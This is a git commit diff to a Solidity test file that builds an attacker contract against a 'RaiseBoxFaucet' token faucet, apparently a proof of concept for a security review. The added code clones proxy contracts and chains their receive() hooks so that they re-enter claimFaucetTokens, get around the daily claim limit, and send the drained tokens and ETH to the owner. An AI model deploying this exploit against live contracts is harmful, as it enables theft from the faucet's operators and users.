bba4ef397b9ec06263e5f1613681771ad39c2f3f
b-elia <bordonielia96@gmail.com>
2025-10-15 17:39:21 +0200

    created proxy contract for reentrancy

--- test/AttackerContract.sol
+++ test/AttackerContract.sol
@@ -3,6 +3,7 @@ pragma solidity ^0.8.30;
 
 import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";
+import {Clones} from "@openzeppelin/contracts/proxy/Clones.sol";
 
 
 interface IRaiseBoxFaucet is IERC20 {
@@ -18,36 +19,76 @@ interface IRaiseBoxFaucet is IERC20 {
 
 contract AttackerMainContract is Ownable {
     IRaiseBoxFaucet raiseBoxFaucet;
-
+    address public implementation;
+    address payable[] public attackers;
+    bool public isSetupComplete;
     constructor(address _raiseBoxFauecet)Ownable(msg.sender) payable{
         raiseBoxFaucet = IRaiseBoxFaucet(_raiseBoxFauecet);
+        implementation = address(new AttackerContract(address(raiseBoxFaucet)));
+    }
+
+    function deployAttackers(uint256 count) external onlyOwner {
+        require(!isSetupComplete, "Setup already completed");
+        
+        for(uint i = 0; i < count; i++) {
+            address clone = Clones.clone(implementation);
+            attackers.push(payable(clone));
+        }
+    }
+
+    function setupChain() external onlyOwner {
+        require(attackers.length > 0, "No attackers deployed");
+        require(!isSetupComplete, "Setup already completed");
+        
+        for(uint i = 0; i < attackers.length - 1; i++) {
+            AttackerContract(attackers[i]).setNextAddress(attackers[i + 1]);
+        }
+        
+        isSetupComplete = true;
     }
 
     function attack() external onlyOwner {
-        (uint256 numberOfContracts, bool numberIsEven) = _getNumberOfContract();
-        address payable [] memory attackers  = new address payable[] (numberOfContracts);
-        for(uint i = 0; i <numberOfContracts; i++){
-
-            AttackerContract attacker = new AttackerContract(address(raiseBoxFaucet));
-            attackers[i] = payable(address (attacker));
-        }
-
-        for(uint i = 0; i <numberOfContracts; i++){
-            AttackerContract(attackers[i]).attack();
-        }
-        if(!numberIsEven){
+        require(isSetupComplete, "Setup not completed");
+        require(attackers.length > 0, "No attackers deployed");
+      
+        AttackerContract(attackers[0]).attack();
+        
+        (, bool numberIsEven) = getNumberOfContract();
+        if(!numberIsEven && raiseBoxFaucet.dailyClaimCount() < raiseBoxFaucet.dailyClaimLimit()) {
             raiseBoxFaucet.claimFaucetTokens();
         }
-        raiseBoxFaucet.transfer(owner(), raiseBoxFaucet.balanceOf(address(this)));
-        (bool success, ) = owner().call{value: address(this).balance}("");
-        require(success, "final eth transfer Failed");
+
+        _withdrawAll();
+    }
+
+
+    function withdrawAll() external onlyOwner {
+        _withdrawAll();
+    }
+
+    function _withdrawAll() private {
+        uint256 tokenBalance = raiseBoxFaucet.balanceOf(address(this));
+        if(tokenBalance > 0) {
+            raiseBoxFaucet.transfer(owner(), tokenBalance);
+        }
+        
+        uint256 ethBalance = address(this).balance;
+        if(ethBalance > 0) {
+            (bool success, ) = owner().call{value: ethBalance}("");
+            require(success, "Final ETH transfer failed");
+        }
+    }
+
+    function reset() external onlyOwner {
+        delete attackers;
+        isSetupComplete = false;
     }
 
     receive() payable external {
         
     }
 
-    function _getNumberOfContract()private view returns(uint256, bool){
+    function getNumberOfContract()public view returns(uint256, bool){
         uint256 temporaryNumberOfContracts = (raiseBoxFaucet.dailyClaimLimit() - raiseBoxFaucet.dailyClaimCount())* 10 / 2;
         uint256 numberOfContracts;
         bool numberIsEven;
@@ -62,32 +103,38 @@ contract AttackerMainContract is Ownable {
 }
 
 contract AttackerContract {
-    IRaiseBoxFaucet immutable raiseBoxFaucet;
-
-    bool private stopAttack;
-    address private immutable owner;
+    IRaiseBoxFaucet public immutable raiseBoxFaucet;
+    address private immutable deployer;
+    address payable private nextAddress;
     
-    constructor(address _raiseBoxFauecet) payable{
-        raiseBoxFaucet = IRaiseBoxFaucet(_raiseBoxFauecet);
-        owner = msg.sender;
+    constructor(address _raiseBoxFaucet) {
+        raiseBoxFaucet = IRaiseBoxFaucet(_raiseBoxFaucet);
+        deployer = msg.sender;
     }
 
+    function setNextAddress(address _nextAddress) external {
+        require(msg.sender == deployer, "Not authorized");
+        nextAddress = payable(_nextAddress);
+    }
 
-    function attack() external{
-        require(msg.sender == owner, "notMainContract");
+    function attack() external {
         raiseBoxFaucet.claimFaucetTokens();
-        (bool ethTransferSuccess,) = owner.call{value: address(this).balance}("");
-        require(ethTransferSuccess, "eth transfer failed");
-        (bool tokenTransferSuccess) = raiseBoxFaucet.transfer(owner, raiseBoxFaucet.balanceOf(address(this)));
-        require(tokenTransferSuccess, "token transfer failed");
-        stopAttack = false;
-    }
-
-    receive() external payable{
-        if(!stopAttack){
-            stopAttack = true;
-            raiseBoxFaucet.claimFaucetTokens();
-
+        
+        uint256 ethBalance = address(this).balance;
+        if(ethBalance > 0) {
+            (bool ethSuccess, ) = deployer.call{value: ethBalance}("");
+            require(ethSuccess, "ETH transfer failed");
+        }
+        
+        uint256 tokenBalance = raiseBoxFaucet.balanceOf(address(this));
+        if(tokenBalance > 0) {
+            bool tokenSuccess = raiseBoxFaucet.transfer(deployer, tokenBalance);
+            require(tokenSuccess, "Token transfer failed");
         }
     }
-}
+
+    receive() external payable {
+        if(nextAddress != address(0)) {
+            AttackerContract(nextAddress).attack();
+        }
+    }
